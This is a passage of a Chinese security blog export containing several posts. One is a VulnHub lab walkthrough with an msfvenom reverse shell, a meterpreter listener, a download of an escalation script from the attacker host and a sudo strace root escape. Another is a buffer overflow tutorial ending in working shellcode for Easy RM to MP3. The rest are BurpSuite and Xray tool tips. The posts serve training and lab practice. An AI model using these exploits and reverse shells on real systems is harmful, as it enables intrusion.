seconds\n\n\n\n在nmap的443端口输出信息中看到docker.registry.htb，加到&#x2F;etc&#x2F;hosts中后访问\nhttps://mp.weixin.qq.com/s/6YP17AS2gnFoKVvHByx_Ew\n","categories":["渗透靶场"],"tags":["HackTheBox"]},{"title":"OWASP Juice Shop靶场练习","url":"/2019/12/owasp-juice-shop%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","content":"简介OWASP Juice Shop是一个nodejs写的开源web应用，它是一个包含了OWASP TOP 10以及许多Web漏洞的渗透练习靶场项目。\n环境搭建git clone https://github.com/bkimminich/juice-shop.gitcd juice-shopnpm installnpm start\n\n安装完毕后启动，浏览器访问http://localhost:3000。\n其他安装方式在线托管在Heroku上部署（免费（$ 0 &#x2F;月）dyno）\n\n注册Heroku并 登录到您的帐户\n点击这里，然后按照说明进行操作\n\ndockerdocker pull bkimminich/juice-shopdocker run -d -e &quot;NODE_ENV=ctf&quot; -p 3000:3000 bkimminich/juice-shop# 显示flag 易于后面交题目\n\nCTFdJuice Shop提供了方便的juice-shop-ctf-cli工具 来简化使用开源CTFd框架的CTF的托管\n安装juice-shop-ctf-cli:\nnpm install -g juice-shop-ctf-cli\n\n然后运行该工具\njuice-shop-ctf\n\n\n\n在线：http://owasp.herokuapp.com/\n参考\n搭建OWASP-Juice-Shop测试环境-并搭建CTF环境\nhttp://shaobaobaoer.cn/archives/510/owasp-juice-shop\n","categories":["渗透靶场"],"tags":["OWASP"]},{"title":"Vulhub Writeup-unknowndevice64-v1","url":"/2019/12/vulhub-writeup-unknowndevice64-v1/","content":"靶场下载VulnHub:  unknowndevice64\n网络环境\n\n\n虚拟机\nIP\n\n\n\nkali\n192.168.19.142\n\n\nunknowndevice64\n192.168.1.132\n\n\n通过netdiscover、nmap扫描局域网发现vulhub靶机的IP。\n渗透思路扫描端口及服务\n# nmap -T4 -sS -sV -p- 192.168.19.132Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 14:56 CSTNmap scan report for 192.168.19.132Host is up (0.00057s latency).Not shown: 65533 closed portsPORT      STATE SERVICE VERSION1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)MAC Address: 00:0C:29:E6:22:E7 (VMware)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds\n\n发现http服务，浏览器访问 31337端口\n\n查看页面源代码获得提示\n\n浏览器访问http://192.168.19.132:31337/key_is_h1dd3n.jpg 发现是一张图片。\n\n 英文提示说明数据可能隐藏在图片中。下载图片后，使用binwalk查看是否有隐藏信息，使用exiftool查看元数据，均无发现。\n\n注：exiftool需要单独安装：apt-get install exiftool\n\n\n使用常见图片数据隐写工具stegslove、wbstego、steghide尝试进行解密，发现利用steghide工具可以提取隐藏的信息，steghide用法示例：\n# 将hide.txt文件隐藏到1.jpg中：steghide embed -cf 1.jpg -ef hide.txt -p 123456# 从1.jpg提取隐藏文件hide.txt:steghide extract -sf 1.jpg -p 123456\n\n\n这里需要解密密码，我们猜测密码是提示的内容h1dd3n，成功解密出h1dd3n.txt文件。这里如果猜不到，可以使用密码字典暴力破解的方式，见后文cracksteghide.py。\n经常打CTF的应该很熟悉，隐藏文件的内容是经过了brainfuck编码的数据，使用Python-Brainfuck解密：\ngit clone https://github.com/pocmo/Python-Brainfuck.gitcd Python-Brainfuckpython brainfuck.py ../h1dd3n.txt\n\n\n也可以使用在线解密工具解密：\n\nhttps://www.splitbrain.org/services/ook\nhttp://ctf.ssleye.com/brain.html\n\n解密结果ud64:1M!#64@ud看起来像是用户名密码，最开始我们扫描出ssh服务运行在1337端口上，于是ssh尝试登录，发现登录成功：\n\n登录后发现这是一个受限的shell，并且无法使用python、expect命令获得交互shell。\npython -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;expect -c &#x27;spawn bash;interact&#x27;\n\n\n于是我们使用kali生成反弹木马，赋予执行权限，并通过ssh上传至目标靶机。这里从靶机的名字unknowndevice64我们猜测可能是64位系统，不过生成32位的程序在64位系统中也能执行。\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.19.142 LPORT=9999 -f elf -o revshell.elfchmod +x revshell.elf\n\n因为是受限的shell，因此我们需要把木马程序上传到当前环境变量目录下，使用echo $PATH命令查看：\n# echo $PATH/home/ud64/prog\n\n上传木马\nscp -P 1337 revshell.elf ud64@192.168.19.132:prog\n\nkali启动msf监听\nmsf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcppayload =&gt; linux/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.19.142LHOST =&gt; 192.168.19.142msf5 exploit(multi/handler) &gt; set LPORT 9999LPORT =&gt; 9999msf5 exploit(multi/handler) &gt; run\n\n当目标执行revshell.elf时即可接收到反弹shell。\n\n下一步就是提权了。在meterpreter中输入shell进入shell模式，并通过python获得一个交互shell。\n\nkali上使用python -m SimpleHTTPServer命令启动一个http服务，托管提权辅助脚本linuxprivchecker，靶机上下载提权脚本：\nwget http://192.168.19.142:8000/linuxprivchecker.py\n\n刚才也可以在meterpreter中直接上传脚本\nmeterpreter &gt; upload /root/linuxprivchecker.py /tmp/linuxprivchecker.pymeterpreter &gt; chmod 744 /tmp/linuxprivchecker.pymeterpreter &gt; shell\n\nwget下载linuxprivchecker.py后  ，执行python linuxprivchecker.py命令查看提权辅助脚本的输出，发现可以使用sudo进行提权。\n\n查看下拥有sudo权限的用户或者程序，发现能够以sudo权限执行/usr/bin/sysud64。\n\n执行/usr/bin/sysud64 -h命令查看这个进程的情况，发现实际上就是strace。\n\n在GTFOBins 项目主页可以找到利用strace提权的方法\n\n利用strace的sudo权限进行提权\nsudo /usr/bin/sysud64 -o /dev/null /bin/sh\n\n\n可以看到成功提升到了root权限，在&#x2F;root目录下即可查看flag.txt文件\n\ncracksteghide.py\n#!/usr/bin/env python# -*- coding: utf-8 -*-# @ Author: ssooking# @ Blog  : www.cnblogs.com/ssooking# @ Github: https://github.com/ssookingimport sysimport sysfrom subprocess import *usage = &quot;\\n[+] Usage: sudo python &quot;+sys.argv[0]+&quot; [Steg Picture File]&quot;+&quot; [Password File]\\n\\n&quot;usage += &quot;    Example: sudo python &quot;+sys.argv[0]+&quot; 1.jpg&quot;+&quot; password.txt\\n&quot;def CrackedStegHide(stegfile,passfile):\terrors = [&#x27;Extract failed&#x27;, &#x27;steghide --help&#x27;, &#x27;Syntax error&#x27;]\tcmdFormat = &quot;/usr/bin/steghide extract -sf %s -p %s&quot;    \tf = open(passfile, &#x27;r&#x27;)\tfor l in f.readlines():\t\tcmd = cmdFormat % (stegfile, l.strip())\t\tp = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)\t\tcontent = unicode(p.stdout.read(), &#x27;gbk&#x27;)\t\tfor err in errors:\t\t\tif err in content:\t\t\t\tbreak\telse:\t\tprint content,        if &quot;wrote extracted data to&quot; in content:        \tprint &#x27;[+] Extracted successfully, the pass is %s !&#x27; % (l.strip())        else:        \tprint &#x27;[!] Extract failed, maybe you shoud change your password file. &#x27;\t\tf.close()\t\treturnif __name__ == &#x27;__main__&#x27;:\tif len(sys.argv)&lt;=1:\t\tprint(usage)\t\tsys.exit(1)\tstegfile = sys.argv[1]\tpassfile = sys.argv[2]\tCrackedStegHide(stegfile,passfile)\n\n\n\nReference\nhttps://blog.werner.wiki/penetrate-unknowndevice64/\n\nhttps://www.hackingarticles.in/unknowndevice64-1-vulnhub-lab-walkthrough/\n\nRestricted Linux Shell Escaping Techniques\n\n\n","categories":["渗透靶场"],"tags":["vulhub"]},{"title":"Easy RM to MP3漏洞分析","url":"/2020/01/easy-rm-to-mp3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"测试环境\n系统：Win7 SP1 x64 (关闭安全防护)\n调试器：Immunity Debugger\n漏洞信息：https://www.exploit-db.com/exploits/9177\n漏洞软件：Easy RM to MP3 Conversion Utility 2.7.3.700\n\n\nCrash测试生成Crash测试文件\npython -c &quot;print &#x27;A&#x27; * 10000&quot; &gt; crash.m3u\n\n使用Easy RM to MP3 Convertes加载Playlist Files文件，选择crash.m3u。加载后，程序会报错。\n\n\n程序未崩溃，说明我们的输入的Crash字符长度还不够。于是继续生成更长的crash字符\npython -c &quot;print &#x27;A&#x27; * 30000&quot; &gt; crash.m3u\n\n当加载30000个字符的文件时，程序崩溃。\n\n漏洞利用使用 Immunity Debugger打开RM2MP3Converter.exe，按下两次F9键运行程序，然后加载crash.m3u。\n\n此时会看到Access violation when executing [41414141]，并且EIP的值被覆盖，说明程序存在经典缓冲区溢出漏洞。接下来使用mona插件进行漏洞利用开发。\n1.⽣成测试字符在Immunity Debugger的命令执行窗口中输入：\n!mona pc 30000（!mona pattern_create 30000）\n\n运⾏完在日志文件C:\\immdlogs\\RM2MP3Converter\\pattern.txt中找到测试字符串。\n2.确定EIP地址编辑Python脚本，把上一步mona生成的测试字符串ASCII拷贝到测试mona30000.txt中，然后把mona30000.txt修改为mona30000.m3u。或者用下面的python脚本生成：\n#!/usr/bin/env python# -*- coding: utf-8 -*-mona_pattern = &quot;&quot;    #填写ASCII的内容bof = open(&#x27;mona30000.m3u&#x27;,&#x27;w&#x27;)bof.write(mona_pattern)bof.close()\n\n然后加载mona30000.m3u。此时在调试器中可以看到Access violation标志，EIP的地址为346C4833。\n\n3.确定偏移量在确定了EIP地址后，需要计算距离EIP的偏移量。\n!mona po 346C4833（!mona pattern_offset 346C4833）\n\n此时在mona的日志窗口(ALT+L)中可以看到计算出的偏移量\nPattern 3Hl4 (0x346C4833) found in cyclic pattern at position 5801\n\n可以看到，这里计算出的EIP偏移是5801，明显跟Crash测试中确定的范围25000-30000不符合。于是换个方法。\nmona区间方式计算偏移确定造成程序崩溃的缓冲区长度区间\n创建一个包含25000个A和5000个B的文件。加载后造成Crash，如果EIP包含41414141（AAAA），说明EIP位于20000和25000之间；如果EIP包含42424242（BBBB），则EIP位于25000和30000之间。\n#!/usr/bin/env python# -*- coding: utf-8 -*-bof = open(&#x27;crash.m3u&#x27;,&#x27;w&#x27;)bof.write(&#x27;A&#x27;*25000)bof.write(&#x27;B&#x27;*5000)bof.close()\n\n经过测试，可以确定EIP的偏移位于25000-30000之间。于是前25000都用A填充，使用!mona pc 5000生成后5000个测试字符。使用下面的代码生成测试文件：\n#!/usr/bin/env python# -*- coding: utf-8 -*-pattern=&quot;xxxx&quot;        #!mona pc 5000 =&gt; ASCIIbof = open(&#x27;eip.m3u&#x27;,&#x27;w&#x27;)bof.write(&#x27;A&#x27;*25000)bof.write()bof.close()\n\n同上述步骤，加载eip.m3u文件后，在调试器中确定了eip地址为6B42306B，执行!mona po 6B42306B计算得到偏移量为1081。这个偏移量再加上25000，即25000+1081=26081，因此正确的偏移量是26081。\nMetasploit计算偏移量Metasploit有辅助工具pattern_create.rb、pattern_offset.rb可以协助我们计算偏移量，用法与mona差不多。\n$ locate pattern_create.rb/usr/share/metasploit-framework/tools/exploit/pattern_create.rb\n\n1.生成测试字符串\n$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 30000 &gt; pattern.txt\n\n与上面相同的操作步骤确定EIP地址为346C4833。\n2.计算详细的偏移量。\n$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 346C4833 -l 30000[*] Exact match at offset 5801[*] Exact match at offset 26081\n\n可以推断，26081是正确的偏移量。\n4.验证偏移量此时可以编写脚本，验证偏移量是否正确，如果正确，返回地址会被覆盖成我们测试的内容。这里设置理想情况下，EIP的值被覆盖为BCDE的十六进制值。\n#!/usr/bin/env python# -*- coding: utf-8 -*-bof = open(&#x27;overeip.m3u&#x27;,&#x27;w&#x27;)bof.write(&#x27;A&#x27; * 26081)bof.write(&#x27;BCDE&#x27;)    #BCDE =&gt; 42434445bof.close()\n\n加载overeip.m3u后，我们可以在调试器中看到EIP已经被精准覆盖成了BCDE的十六进制值。\n\n确定了偏移量之后，可以开发漏洞利用代码了。\n5.编写shellcode查看加载的模块\n!mona modules\n\n我们使用”跳板”方式执行shellcode，可以在防护全关闭的模块中寻找。\n最好的是找到一个ASLR = False和Rebase = False的模块，但是唯一的模块就是RM2MP3Converter.exe。但是，我们不能使用该模块，因为它的地址中有一个空字节。因此，接下来要尝试的是查看具有Rebase = True和ASLR = False的模块在实践中是否不会移动，即使从原理上讲它可以重新建立基础。最后仅保留ASLR = False的模块。\n这里我在user32.dll中搜索jmp esp指令的地址。\n!mona find -s &#x27;\\xff\\xe4&#x27; -m 模块!mona find -s &quot;\\xff\\xe4&quot; -m user32.dll!mona jmp -r esp -m user32.dll!mona jmp -r esp -m MSRMfilter03.dll\n\n\n我们使用0x7DC7FCDB。接下来构造shellcode，使用弹计算器的shellcode。\n&quot;\\x33\\xC0&quot;                          # XOR EAX,EAX&quot;\\x50&quot;                              # PUSH EAX&quot;\\x68\\x2E\\x65\\x78\\x65&quot;              # PUSH &quot;.exe&quot;&quot;\\x68\\x63\\x61\\x6C\\x63&quot;              # PUSH &quot;calc&quot;&quot;\\x8B\\xC4&quot;                          # MOV EAX,ESP&quot;\\x6A\\x01&quot;                          # PUSH 1&quot;\\x50&quot;                              # PUSH EAX&quot;\\xBB\\x41\\x33\\xDF\\x7D&quot;              # MOV EBX,0x7ddf3341    (kernel32.WinExec)&quot;\\xFF\\xD3&quot;                          # CALL EBX&quot;\\x53&quot;                                                            # PUSH EBX&quot;\\xB8\\x28\\x7A\\xD7\\x7D&quot;                            # MOV EAX,0x7dd77a28    (kernel32.ExitProcess)&quot;\\xFF\\xD0&quot;                                                    # CALL EAX\n\n其中系统库函数WinExec、ExitProcess的地址：\nC:\\arwin.exe Kernel32.dll WinExec         =&gt; 0x7ddf3341C:\\arwin.exe Kernel32.dll ExitProcess =&gt; 0x7dd77a28\n\n确定shellcode空间大小\n#!/usr/bin/env python# -*- coding: utf-8 -*-import socketimport structjunk = &quot;A&quot;*26081over_eip_test = &#x27;BCDE&#x27;over_eip = struct.pack(&quot;&lt;L&quot;,0x7dc7fcdb)            #!mona jmp -r esp -m user32.dll =&gt; 0x7dc7fcdbpayload = &quot;F&quot;*200payload = junk + over_eip_test + payloadtry:    bof = open(&#x27;poctest.m3u&#x27;,&#x27;w&#x27;)    bof.write(payload)    print &quot;Create exploit file successfully!&quot;except:    print &quot;Create exploit file failed!&quot;\n\n加载后，我们看到F的位置就是能够输入的最大shellcode长度 ，即 192 字节\n\n下面就是shellcode部分了。下载calc.exe shellcode，并将其转换为十六进制格式。可参考博文：binary to shellcode。\nif __name__ == &quot;__main__&quot;:    shellcode = &quot;\\&quot;&quot;    ctr = 1    maxlen = 15    for b in open(&quot;win-exec-calc-shellcode.bin&quot;, &quot;rb&quot;).read():        shellcode += &quot;\\\\x&quot; + b.encode(&quot;hex&quot;)    if ctr == maxlen:        shellcode += &quot;\\&quot; +\\n\\&quot;&quot;        ctr = 0        ctr += 1    shellcode += &quot;\\&quot;&quot;    print shellcode\n\nWith my JMP ESP address and shellcode in hand, it was time to craft my full exploit.\nbof = open(&#x27;crash.m3u&#x27;,&#x27;w&#x27;)bof.write(&#x27;A&#x27;*26066)  # offsetbof.write(&#x27;\\xCC\\x8C\\x28\\x76&#x27;)  # kernel32.dll JMP ESP (0x76288CCC)bof.write(&#x27;\\x90&#x27;*16)  # NOP sled# win-exec-calcbof.write(&quot;\\x31\\xc9\\x49\\x31\\xd2\\xe3\\x47\\x52\\x68\\x63\\x61\\x6c\\x63\\x89\\xe6&quot; +  &quot;\\x52\\x56\\x64\\x8b\\x72\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x0c\\xad\\x8b\\x30&quot; +&quot;\\x8b\\x7e\\x18\\x8b\\x5f\\x3c\\x8b\\x5c\\x1f\\x78\\x8b\\x74\\x1f\\x20\\x01&quot; +&quot;\\xfe\\x8b\\x4c\\x1f\\x24\\x01\\xf9\\x0f\\xb7\\x2c\\x51\\x42\\xad\\x81\\x3c&quot; +&quot;\\x07\\x57\\x69\\x6e\\x45\\x75\\xf1\\x8b\\x74\\x1f\\x1c\\x01\\xfe\\x03\\x3c&quot; +&quot;\\xae\\xff\\xd7\\x6a\\x60\\x5a\\x68\\x63\\x61\\x6c\\x63\\x54\\x59\\x48\\x83&quot; +&quot;\\xec\\x28\\x65\\x48\\x8b\\x32\\x48\\x8b\\x76\\x18\\x48\\x8b\\x76\\x10\\x48&quot; +&quot;\\xad\\x48\\x8b\\x30\\x48\\x8b\\x7e\\x30\\x03\\x57\\x3c\\x8b\\x5c\\x17\\x28&quot; +&quot;\\x8b\\x74\\x1f\\x20\\x48\\x01\\xfe\\x8b\\x54\\x1f\\x24\\x0f\\xb7\\x2c\\x17&quot; +&quot;\\x8d\\x52\\x02\\xad\\x81\\x3c\\x07\\x57\\x69\\x6e\\x45\\x75\\xef\\x8b\\x74&quot; +&quot;\\x1f\\x1c\\x48\\x01\\xfe\\x8b\\x34\\xae\\x48\\x01\\xf7\\x99\\xff\\xd7&quot;)bof.close()\n\nReference\nhttps://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/\n\nhttps://samsclass.info/127/proj/easymp3-with-aslr.htm\n\nhttps://www.doyler.net/security-not-included/easy-rm-to-mp3-converter-2-7-3-buffer-overflow-exploit-tutorial\n\nhttp://scx020c07c.blogspot.com/2012/09/buffer-overflow-easy-rm-to-mp3-converter.html\n\n\n","categories":["漏洞分析","Pwn"],"tags":["binary-exploitation"]},{"title":"BurpSuite Logger++ Filter","url":"/2021/11/burpsuite-logger-filter/","content":"JSON Post Responses Containing Valid Credit Card Numbers\nMETHOD == &quot;post&quot; &amp;&amp; MIMETYPE == &quot;json&quot; &amp;&amp; RESPONSE == /.*\\b(?:4[0-9]&#123;12&#125;(?:[0-9]&#123;3&#125;)?|(?:5[1-5][0-9]&#123;2&#125;|222[1-9]|22[3-9][0-9]|2[3-6][0-9]&#123;2&#125;|27[01][0-9]|2720)[0-9]&#123;12&#125;|3[47][0-9]&#123;13&#125;|3(?:0[0-5]|[68][0-9])[0-9]&#123;11&#125;|6(?:011|5[0-9]&#123;2&#125;)[0-9]&#123;12&#125;|(?:2131|1800|35\\d&#123;3&#125;)\\d&#123;11&#125;)\\b.*/More to come...\n\n","categories":["神兵利器"],"tags":["BurpSuite"]},{"title":"BurpSuite Match and Replace Tips","url":"/2021/11/burpsuite-match-and-replace-tips/","content":"基本\n在burpsuite的proxy的opions中禁用掉 web interface [http://burpsuite](http://burpsuite/)防止被检测到使用burpsuite在抓包\n禁止发送usage信息\n\n将 401响应码改为200，或者修改为成功的响应数据包内容，可以用来挖未授权访问的洞，Proxy-&gt;Options-&gt;Match and Replace-&gt;Add\n正则匹配筛选页面结果\n爆破的时候用来筛选关键词 Intruder-&gt;Options-&gt;Grep-Extract-&gt;Add\n检测CORSProxy-&gt;Options-&gt;Match and Replace，\nRequest header 将空(&#x2F;)替换we Origin:foo.example.org，burp 会加个 Origin 的请求头\nResponse header =&gt; Access-Control-Allow-Headers:*\n\n漏洞的挖掘原理方面，这篇博客讲的很详细 CORS原理及利用整理\n过滤无用OPTIONS请求\n\nhttps://parsiya.net/blog/2019-04-06-hiding-options-an-adventure-in-dealing-with-burp-proxy-in-an-extension/\n\nhttps://captmeelo.com/pentest/2020/01/06/filter-options-method.html\n\nhttps://github.com/capt-meelo/filter-options-method\n\nhttps://www.cnblogs.com/wkzb/p/15054038.html\n\nhttps://parsiya.net/blog/2019-10-13-quality-of-life-tips-and-tricks-burp-suite/\n\n\n其他配置\n\nhttps://parsiya.net/blog/2019-10-13-quality-of-life-tips-and-tricks-burp-suite/\n\nhttps://github.com/parsiya/Parsia-Clone/blob/main/configs/burp-default-config.json\n\nhttps://www.ryanwendel.com/2019/04/23/burp-suite-tips-volume-1/\n\nhttps://blog.isiraadithya.com/intigriti-tip-using-burp-match-and-replaces-rules/\n\n\nhttps://gowthams.gitbook.io/bughunter-handbook/burp-suite-tips-and-tricks\nhttps://github.com/PortSwigger/match-replace-session-action\n","categories":["神兵利器"],"tags":["BurpSuite"]},{"title":"BurpSuite Tips","url":"/2020/11/burpsuite-tips/","content":"https://mp.weixin.qq.com/s/VZ6or0lswen9mV7-anlJZg\n字体新版一打开容易光标错位，默认情况下使用字体是 Courier New，显示不了中文。换用 Monospaced 字体即可正常显示中文，一般这里就不会错位了，错位的话可以大小弄大一些：\n如果是 win 下，Burp 字体容易模糊，特别是 exe 版本。如果模糊，可以设置缩放 125% 就好了。可以修改配置文件：BurpSuitePro.vmoptions\n-Dsun.java2d.dpiaware=true-Dsun.java2d.uiScale=1.25\n\n\n\n\n\n浏览器自带请求禁用比如在用 firefox 时候，会拦截到一些浏览器自己的请求：\n有一个高级设置可以禁用此功能，但 UI 中没有任何内容。在地址栏中输入：about:config\n搜索 network.captive-portal-service.enabled 并单击它以切换为 false，它将停止发送此请求\n如何阻止 firefox 这些没用的请求，按这篇设置以后会少一些 firefox 的请求：https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections但是还是会有一些域名的请求，转到 about:config, 再次搜索 self-repair.mozilla.org直接把此首选项的值删掉即可。这样 firefox 就没有发出那些没用的请求了。\nTLS Pass ThroughBurp suite抓包时可以设置TLS Pass Through排除一些网站的干扰：\n先收集有哪些需要过滤的地址：挂着代理，等 20 分钟，burp 中查看：\n收集完了以后开始复制这些地址，先转到 target-&gt;scope，开启 Use advanced scope control\n然后转到到 Target &gt; Site map 复制这 url，单击 Filter 并单击 Show all 按钮\nAdd to Scope，切回去就能看到这些 url，再从 scope 里拿出来，你就有一批需要过滤的地址了： \n然后将这些将这些 url 添加到 Burp TLS Pass Through，但是 TLS Pass Through 可以选择粘贴 URL 或从文件加载列表。不支持刚才复制出来的格式。该文件每行应该有一个正常的 URL（不是正则表达式）。\nBurp Suite &#x3D;&gt; Proxy &#x3D;&gt; Options &#x3D;&gt; TLS Pass Through\n.*\\.google\\.com.*\\.google\\.com\\.hk.*\\.googleapis\\.com.*\\.google-analytics\\.com.*\\.gstatic\\.com.*\\.baidu\\.com.*\\.bdstatic\\.com.*\\.jpush\\.cn.*\\.firefox\\.com.*\\.firefoxchina\\.cn.*\\.mozilla\\.org.*\\.amap\\.com.*\\.aliyuncs\\.com.*\\.player.vimeo\\.com.*\\.mozilla\\.net.*\\.mozilla\\.com.*\\.lastpass\\.com.*\\.shodan\\.io.*\\.whatruns\\.com.*\\.wappalyzer\\.comlastpass.com.*\\.jd\\.com.*\\.sogou\\.com\n\nURL and domain\n*.google.com*.github.com*.google.com*.google.com.hk*.googleapis.com*.google-analytics.com*.gstatic.com*.baidu.com*.bdstatic.com*.jpush.cn*.firefox.com*.firefoxchina.cn*.mozilla.org*.amap.com*.aliyuncs.com*.player.vimeo.com*.mozilla.net*.mozilla.com*.lastpass.com*.shodan.io*.whatruns.com*.wappalyzer.com*.jd.com*.sogou.com*.csdn.net*.apple.com*.github.comhttps://api.neixin.cn/ems-auth/qrcode/pollinghttps://api.neixin.cn/monitor/alivehttps://dreport.meituan.net/https://catfront.dianping.com\n\n\n\n\n\nscope 过滤 HTTP 不必要请求上面的功能过滤了一些不必要的 https 请求，但 HTTP 请求仍然会被代理，常见的方法可以在浏览器代理插件中进行过滤：\n还可以善用 Burp 的 scope 功能：可以创建 URL 匹配规则以包含或排除可能与测试范围无关的特定 URL。\nscope 比较方便是支持正则，比如整个站 *.google.com 或某个目录 google.com&#x2F;images&#x2F;\n设置了 scope 后可以在 HTTP History 中进行过滤，选择 “Show only in-scope items”\nhistory 也可以设置一些过滤选项大家都很熟悉，Filter by MIME type设置 MIME 类型，Other binary需要查看大多数二进制数据（application&#x2F;octet-stream），Filter by file extension可以设置后缀的过滤，这里说一下Filter by file extension最好使用它的 hide 功能即可，过滤掉常见静态后缀和字体后缀即可。Filter by listener用的少一些，当应用程序在不同的端口上进行通信并且不支持代理设置时特别有用。 \n隐藏特定方法的请求 (OPTIONS)测试的时候会发送很多特定方法的包，比如查看 history 中存在很多测试的 OPTIONS 包：\n这里可以用到一个拓展：https://github.com/pajswigger/filter-options\n它增加 Content-Type: application&#x2F;octet-stream 了每个 OPTIONS 请求的响应。然后 HTTP History 将该请求分类为 Other Binary，我们可以按此进行过滤。\n还可以参考这篇，将 OPTIONS 请求加上 MIME 类型为 JSON 以达到来过滤的目的：https://captmeelo.com/pentest/2020/01/06/filter-options-method.htmlhttps://github.com/capt-meelo/filter-options-method\n对请求包进行非缓存的响应：可以通过在 Burp 的代理选项中启用强制所有响应非缓存，这样就可以看到操作后最新的版本：\nRequire non-cached response两个选项勾上\n设置不发送隐私默认 PortSwigger 会收集数据，可以关闭这个匿名反馈传输\nUser options &#x3D;&gt; Performance Feedback &#x3D;&gt; Submit xxx\n禁用 Burp CollaboratorBurp Collaborator 可以用来接受带外，但是每次一打开 burp 就弹出来 Burp Collaborator 很烦，设置中可以关闭：\nsitemap 显示切换默认 sitemap 显示是这样\n个人毕竟喜欢标签切换的形式，简洁一些：在 Sitemap 中任意位置并选择 View -&gt; Tabs 来将 Target 选项卡切换到此视图\n扫描大家都知道 Burp 有两种扫描模式：主动和被动。两者可以同时激活。被动扫描中，它只查看请求 &#x2F; 响应，并且基本上根据其规则集进行 grep，而不发送任何请求。主动扫描中，它实际上会生成有效负载并将它们发送到服务器（并分析请求 &#x2F; 响应）。\n需要注意的就是不要一开始就使用主动扫描，很容易测试时候直接被 waf 给 ban 了，还没测就结束了，老版本有 scanner 的选项卡可以配置，新版可以在 dashboard 配置：\n推荐不改变 Live Passive Scanning 为Scan everything，也可以将其设置为Use custom scope\n","categories":["神兵利器"],"tags":["BurpSuite"]},{"title":"BurpSuite联动Xray","url":"/2020/03/burpsuite%E8%81%94%E5%8A%A8xray/","content":"所需工具：\n\nXray\nBurpSuite\n\n首先xray开启HTTP代理，进行被动扫描\nxray webscan --listen 127.0.0.1:7777 --html-output proxy.html\n\n扫描https站点需要导入xray证书，生成证书方法\nxray genca  \t\t\t\t\t\t\t\t\t\t//Linuxxray_windows_amd64.exe genca\t\t//Windows\n\n然后xray文件夹下会产生ca.crt证书和ca.key两个文件。\nFirefox浏览器没有使用系统的根证书管理器，意味着使用Firefox时需要单独在该浏览内导入证书才可生效。对于移动端等，可以在挂代理之后访问http://xray/然后下载根证书。\n配置代理Upstream Proxy ServersUpstream Proxy Servers设置允许BurpSuite根据用户自定义的规则处理流量数据，控制BurpSuite是将流量发送到上游代理服务器或目标Web服务器。\nBurpSuite &#x3D;&gt; User options &#x3D;&gt; Upstream Proxy Servers\n点击 Add 添加上游代理以及作用域，Destination host 处可以使用*匹配多个任意字符串，? 匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。\nhttps://www.onebug.org/sectools/75713.html\n*ssooking.cn*127.0.0.17777\n\nDestination设置为*\nPassive Scan ClientPassive Scan Client是一个Burp被动扫描流量转发插件，可以方便地将流量转发到各种被动式扫描器中。\n1.下载插件passive-scan-client.jar，加载到burpsuite中启用\n手工编译插件\ngit clone https://github.com/c0ny1/passive-scan-client.gitmvn package\n\n\n\n2.配置passive-scan-client插件\n将地址和端口配置为与xray一致，点击run即可。\n如果要设置域名，不能添加*，不支持模糊匹配\n3.浏览器设置代理到Burp\nBurpsuite SSR\nhttps://2kb.me/967.html?unapproved=2739\n如何利用xray、burp、lsc构成自动化挖src平台\n","categories":["神兵利器"],"tags":["BurpSuite","Xray","被动扫描"]},{"title":"Burpsuite Plugins Development","url":"/2021/12/burpsuite-plugins-development/","content":"辅助文档\nBurpSuite API文档\n\nMaven库搜索：Maven Central Repository Search\n\n公开依赖库见：https://mvnrepository.com/\n\n\n开发一个插件新建Gradle项目，勾选Java，选择JDK11\n在build中添加Burpsuite插件的依赖（类似于pom.xml）\n目前公开的依赖版本可见：Burp Extender API\nimplementation &#x27;net.portswigger.burp.extender:burp-extender-api:2.3&#x27;\n\n点击右上角刷新按钮\n然后点击一下gradle的更新，将依赖下载下来，这样就将我们之前手动复制api文件的操作省掉了。\n如果创建的项目此时没有src\\main目录，解决方法:\n1.首先先打开build.gradle添加如下代码，创建一个Task任务\ntask create_dirs &#123;    sourceSets*.java.srcDirs*.each &#123;        it.mkdirs()    &#125;    sourceSets*.resources.srcDirs*.each &#123;        it.mkdirs()    &#125;&#125;\n\n添加完这个任务后点击右下角的Import Changes\n点击右侧Gradle打开other 就会发现刚才我们写的任务名会在这里，点击执行create_dirs任务即可创建src目录。\n在src&#x2F;main&#x2F;java下新建package，名称为burp。在burp下新建BurpExtender类。\n这个包名和类名是固定的，burpsuite加载插件时就是通过burp.BurpExtender来查找的，如果不这样起名，会报ClassNotFoundException 。\nBurpExtender类需要实现IBurpExtender接口，burp在加载插件时，会调用该接口，并传递IBurpExtenderCallbacks接口供我们使用。\n然后我们添加下面的代码为插件设置名称，并打印success字符串：\npackage burp;public class BurpExtender implements IBurpExtender&#123;   @Override   public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123;   callbacks.setExtensionName(&quot;sendmyexp&quot;);   callbacks.printOutput(&quot;load success&quot;);   &#125;  &#125;\n\n\n\n接着可以编译该项目成jar包，然后让burp加载看看效果。\n点击右侧的gradle菜单，展开菜单，双击shadowjar，gradle会自动编译项目成jar包，jar包位于build目录中的libs目录中。\n在右侧build下选择Jar，尝试编译成jar包\n我们在build目录下的lib文件夹中能清晰的看见，已经打包成功burpguitest2-1.0-SNAPSHOT.jar\n我们需要给自己的插件构建ui界面，为了让IDEA打包GUI界面的类，需要在build.gradle添加com.intellij:forms_rt_依赖。代码如下\nimplementation group: &#x27;com.intellij&#x27;, name: &#x27;forms_rt&#x27;, version: 